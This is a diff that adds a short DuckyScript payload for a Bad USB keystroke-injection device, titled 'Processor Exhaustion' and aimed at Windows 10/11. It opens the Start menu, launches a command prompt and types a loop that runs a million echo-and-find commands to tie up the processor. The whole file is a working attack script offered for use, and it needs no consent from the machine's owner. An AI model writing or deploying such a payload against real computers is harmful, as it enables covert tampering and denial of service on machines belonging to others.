@@ -1,0 +1,22 @@
+REM Title: Bad USB - Processor Exhaustion
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: Opens commandline, then executes PC stress test.
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Command Line
+CTRL ESC
+DELAY 750
+STRING cmd
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Input command
+STRING for /l %i in (1,1,1000000) do echo. 2^32 | find /r ".*"
+ENTER
